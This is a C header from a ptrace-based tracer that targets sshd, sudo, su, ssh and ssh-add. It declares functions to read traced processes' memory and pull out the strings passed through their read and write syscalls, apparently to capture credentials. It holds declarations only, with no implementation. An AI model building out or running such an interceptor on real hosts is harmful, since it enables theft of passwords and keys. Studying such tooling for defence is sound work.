#ifndef SNAKE_TRACERS
#define SNAKE_TRACERS

#include <sys/types.h>

/* TODO: make this process easier
 * Adding a new tracer example (su_tracer):
 * 1.) Add to the enum tracer_types su_tracer
 * 2.) Add string to the validate_process_name
 *      #define PSU "su "
 * 3.) Create su_tracer.{.c, {.h} files add to Makefile
 * 4.) Write the void intercept_su(pid_t) function
 * 5.) Add the function to the tracers array in tracers.c
 * 6.)
*/

#define P_SSH_NET "sshd: [net]"
#define P_SSH_ACC "sshd: [accepted]"
#define P_SUDO "sudo "
#define P_SU "su "
#define P_SSH_CLIENT "ssh "
#define P_SSH_SCP_SFTP "/usr/bin/ssh "
#define P_SSH_ADD "ssh-add "

#ifdef __amd64__
#define eax rax
#define orig_eax orig_rax
#define SYSCALL_read  0
#define SYSCALL_write 1
#define SYSCALL_dup   32
#define SYSCALL_clone 56
#else
#define SYSCALL_read  3
#define SYSCALL_write 4
#define SYSCALL_dup   41
#define SYSCALL_clone 120
#endif

#define _offsetof(a, b) __builtin_offsetof(a,b)
#define get_reg(child, name) __get_reg(child, _offsetof(struct user, regs.name))

enum tracer_types {
  invalid_tracer,
  ssh_tracer,
  sudo_tracer,
  su_tracer,
  ssh_client_tracer
};

void trace_process(pid_t);
long __get_reg(pid_t, int);
int get_syscall(pid_t);
int wait_for_syscall(pid_t);
long get_syscall_arg(pid_t, int);
char *read_memory(pid_t, unsigned long, long);
char *extract_read_string(pid_t, long);
char *extract_write_string(pid_t, long);
int strnascii(const char *, size_t);

void refresh_process_name(pid_t);

void free_process_name(void);
void free_process_path(void);
void free_process_username(void);

//Forward declaration to avoid circular dependancy
void intercept_ssh(pid_t);
void intercept_sudo(pid_t);
void intercept_su(pid_t);
void intercept_ssh_client(pid_t);

#endif
